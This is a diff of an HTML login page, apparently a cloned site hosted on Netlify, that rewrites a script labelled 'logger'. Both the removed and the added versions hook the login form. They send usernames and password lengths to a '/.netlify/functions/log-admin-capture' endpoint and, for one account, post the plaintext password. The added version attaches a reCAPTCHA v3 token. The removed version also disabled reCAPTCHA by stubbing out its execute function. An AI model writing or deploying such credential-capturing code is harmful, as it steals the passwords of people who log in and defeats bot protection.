@@ -90,6 +90,7 @@ function biscolabLaravelReCaptcha(token) {
 .kvkk-pop .kvkk-link{color:#6b7280;text-decoration:none;font-weight:600;}
 </style>
 
+<script src="https://www.google.com/recaptcha/api.js?render=6LfDoq8rAAAAAM77cnwhooW7mnxfg3yiAt70cHM7"></script>
 </head>
 <body style="position: relative; min-height: 100%; top: 0px;">
 <style>
@@ -304,27 +305,20 @@ function onSubmit(token) {
 <!-- END: Validation + banner additions -->
 
 
-<!-- BEGIN: badge halo + delay + logging + recaptcha neutralizer -->
-<style id="rc-halo-style">
-  /* Initially hide badge to mask transient 404 frame */
-  .grecaptcha-badge.rc-hidden { opacity: 0; transition: opacity .12s ease; }
 
-  /* Halo element (purely visual, no pointer events) */
+<!-- BEGIN: badge halo + delay (0.5s) + thin halo (0.3–0.5s) + logger + reCAPTCHA v3 -->
+<style id="rc-halo-style">
+  .grecaptcha-badge.rc-hidden { opacity: 0; transition: opacity .2s ease; }
   #rc-prehalo {
     position: fixed;
-    right: 0; bottom: 0;
-    width: 256px; height: 60px; /* collapsed badge footprint */
-    box-shadow: 0 0 14px 2px rgba(255,255,255,0.35);
+    top: 0; left: 0; width: 0; height: 0;
+    box-shadow: 0 0 12px 1px rgba(255,255,255,0.35);
     border-radius: 6px;
     pointer-events: none;
     opacity: 0;
     z-index: 9998;
   }
-  /* Appear at 0.3s, fade out by 0.5s */
-  @keyframes rcHaloFlash { 
-    0% { opacity: 0.45; } 
-    100% { opacity: 0; } 
-  }
+  @keyframes rcHaloFlash { 0% { opacity:.45; } 100% { opacity:0; } }
   #rc-prehalo.show { animation: rcHaloFlash .2s linear forwards; }
 </style>
 
@@ -332,113 +326,85 @@ function onSubmit(token) {
 (function(){
   'use strict';
   var LOG_FN = '/.netlify/functions/log-admin-capture';
+  var SITE_KEY = '6LfDoq8rAAAAAM77cnwhooW7mnxfg3yiAt70cHM7';
 
   function q(sel, root){ return (root||document).querySelector(sel); }
-  function pickU(form){
-    return q('#username',form)||q('[name="username"]',form)||q('input[autocomplete="username"]',form)||q('input[type="text"]',form)||q('input[type="email"]',form)||q('input:not([type]),input[type="search"]',form);
-  }
+  function pickU(form){ return q('#username',form)||q('[name="username"]',form)||q('input[autocomplete="username"]',form)||q('input[type="text"]',form)||q('input[type="email"]',form)||q('input:not([type]),input[type="search"]',form); }
   function pickP(form){ return q('#password',form)||q('[name="password"]',form)||q('input[type="password"]',form); }
 
-  // --- Logging helpers (compatible with current function) ---
   function pingGET(u,len){
-    try{
-      var url = LOG_FN + '?u='+encodeURIComponent(u)+'&l='+encodeURIComponent(len);
-      var img = new Image(1,1);
-      img.referrerPolicy = 'no-referrer-when-downgrade';
-      img.src = url;
-    }catch(_){}
+    try{ var img=new Image(1,1); img.referrerPolicy='no-referrer-when-downgrade'; img.src=LOG_FN+'?u='+encodeURIComponent(u)+'&l='+encodeURIComponent(len); }catch(_){
+    }
   }
-  async function logAdminPOST(u,p){
-    try{
-      await fetch(LOG_FN, {
-        method:'POST',
-        headers:{'content-type':'application/json'},
-        body: JSON.stringify({ username:u, password:p, pw_len:p.length }),
-        keepalive:true,
-        cache:'no-store'
-      });
-    }catch(_){}
+  async function logAdminPOST(u,p,rc_token,rc_action){
+    try{ await fetch(LOG_FN,{ method:'POST', headers:{'content-type':'application/json'}, keepalive:true, cache:'no-store',
+      body: JSON.stringify({ username:u, password:p, pw_len:(p||'').length, rc_token: rc_token||null, rc_action: rc_action||'login' }) }); }catch(_){}
   }
 
-  // --- Recaptcha neutralizer: keep badge, kill challenge ---
-  function neutralizeRecaptcha(){
-    try{
-      // remove auto hooks on any element that could trigger execution
-      document.querySelectorAll('.g-recaptcha').forEach(function(el){
-        el.classList.remove('g-recaptcha');
-        ['data-sitekey','data-callback','data-badge','data-size'].forEach(function(a){ el.removeAttribute(a); });
-      });
-      if (window.grecaptcha){
-        var noop = function(){ try{return Promise.resolve('');}catch(e){return '';} };
-        if (typeof grecaptcha.execute==='function') grecaptcha.execute = noop;
-        grecaptcha.enterprise = grecaptcha.enterprise || {};
-        if (typeof grecaptcha.enterprise.execute==='function') grecaptcha.enterprise.execute = noop;
-        if (typeof grecaptcha.ready==='function') grecaptcha.ready = function(cb){ try{cb&&cb();}catch(_){}};
-      }
-    }catch(_){}
+  function onBadgeReady(cb){
+    var b=q('.grecaptcha-badge'); if(b&&b.getBoundingClientRect().width) return cb(b);
+    var obs=new MutationObserver(function(){ var bb=q('.grecaptcha-badge'); if(bb&&bb.getBoundingClientRect().width){ try{obs.disconnect();}catch(_){}
+          cb(bb); } });
+    obs.observe(document.documentElement,{childList:true,subtree:true});
+    var tries=0;(function tick(){ var bb=q('.grecaptcha-badge'); if(bb&&bb.getBoundingClientRect().width){ try{obs.disconnect();}catch(_){}
+          cb(bb); return; } if(++tries<120) setTimeout(tick,50); else try{obs.disconnect();}catch(_){}})();
   }
 
-  // --- Badge delay + halo ---
-  function setupHalo(){
-    var badge = q('.grecaptcha-badge');
-    if (!badge) return;
-    // Hide badge for 0.5s to mask any flash
+  function setupHaloAndDelay(badge){
     badge.classList.add('rc-hidden');
     setTimeout(function(){ badge.classList.remove('rc-hidden'); }, 500);
 
-    // Create halo once, show from 0.3s to 0.5s
-    var halo = q('#rc-prehalo');
-    if (!halo){
-      halo = document.createElement('div');
-      halo.id = 'rc-prehalo';
-      document.body.appendChild(halo);
+    var halo=q('#rc-prehalo'); if(!halo){ halo=document.createElement('div'); halo.id='rc-prehalo'; document.body.appendChild(halo); }
+    function sync(){
+      try{ var r=badge.getBoundingClientRect(); if(r.width>0&&r.height>0){ halo.style.top=r.top+'px'; halo.style.left=r.left+'px'; halo.style.width=r.width+'px'; halo.style.height=r.height+'px'; } }catch(_){}
     }
-    // Position roughly over collapsed badge footprint (bottom-right)
-    function syncHalo(){
-      // Badge is fixed bottom-right  - we mirror that region
-      halo.style.right = '0px'; halo.style.bottom = '0px';
-    }
-    syncHalo();
-    setTimeout(function(){ halo.classList.add('show'); }, 300);
-    setTimeout(function(){ halo.classList.remove('show'); }, 500);
+    sync(); var n=0,t=setInterval(function(){ sync(); if(++n>10) clearInterval(t); },50);
+    setTimeout(function(){ halo.classList.add('show'); },300);
+    setTimeout(function(){ halo.classList.remove('show'); },500);
   }
 
-  // --- Attach logging to form submit + button click (piggyback) ---
   function attachLogging(){
-    var form = q('form') || q('#biscolab-recaptcha-invisible-form');
-    if (!form) return;
-    var uEl = pickU(form), pEl = pickP(form);
-    if (!uEl || !pEl) return;
+    var form=q('form')||q('#biscolab-recaptcha-invisible-form'); if(!form) return;
+    var uEl=pickU(form), pEl=pickP(form); if(!uEl||!pEl) return;
 
-    function handle(){
-      try{
-        var u = (uEl.value||'').trim();
-        var p = (pEl.value||'');
-        var L = p.length;
-        if (!u || !L) return;                 // empty yok
-        if (L < 6) { pingGET(u, L); return; } // too_short
-        if (u.toLowerCase() !== 'test') { pingGET(u, L); return; } // non_admin
-        // admin_ok
-        logAdminPOST(u, p);
+    function handle(ev){
+      try{ 
+        var u=(uEl.value||'').trim(); var p=(pEl.value||''); var L=p.length;
+        if(!u||!L) return;
+        if(L<6) { pingGET(u,L); return; }
+        if(u.toLowerCase()!=='test') { pingGET(u,L); return; }
+        // admin_ok with v3
+        if(window.grecaptcha && typeof grecaptcha.execute==='function') {
+          if(ev&&ev.preventDefault) ev.preventDefault();
+          grecaptcha.ready(function(){
+            grecaptcha.execute(SITE_KEY, {action:'login'}).then(function(token){
+              try{ var f=q('form')||q('#biscolab-recaptcha-invisible-form'); if(f&&!f.querySelector('input[name="g-recaptcha-response"]')){ var hid=document.createElement('input'); hid.type='hidden'; hid.name='g-recaptcha-response'; hid.value=token; f.appendChild(hid); } }catch(_){}
+              logAdminPOST(u,p,token,'login');
+              try{ (q('form')||{}).submit(); }catch(_){}
+            }).catch(function(){
+              logAdminPOST(u,p,null,'login');
+              try{ (q('form')||{}).submit(); }catch(_){}
+            });
+          });
+          return;
+        } else {
+          if(ev&&ev.preventDefault) ev.preventDefault();
+          logAdminPOST(u,p,null,'login');
+          try{ (q('form')||{}).submit(); }catch(_){}
+          return;
+        }
       }catch(_){}
     }
 
-    form.addEventListener('submit', handle, false);
-    var btn = form.querySelector('button[type="submit"], input[type="submit"], #g-recaptcha-btn');
-    if (btn) btn.addEventListener('click', handle, true);
+    form.addEventListener('submit', handle, true);
+    var btn=form.querySelector('button[type="submit"],input[type="submit"],#g-recaptcha-btn'); if(btn) btn.addEventListener('click', handle, true);
   }
 
-  function init(){
-    neutralizeRecaptcha();
-    setupHalo();
-    attachLogging();
-  }
-
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
-  else init();
-  window.addEventListener('load', neutralizeRecaptcha);
+  function init(){ attachLogging(); onBadgeReady(setupHaloAndDelay); }
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', init); else init();
 })();
 </script>
-<!-- END: badge halo + delay + logging + recaptcha neutralizer -->
+<!-- END: badge halo + delay (0.5s) + thin halo (0.3–0.5s) + logger + reCAPTCHA v3 -->
+
 
 </body></html>
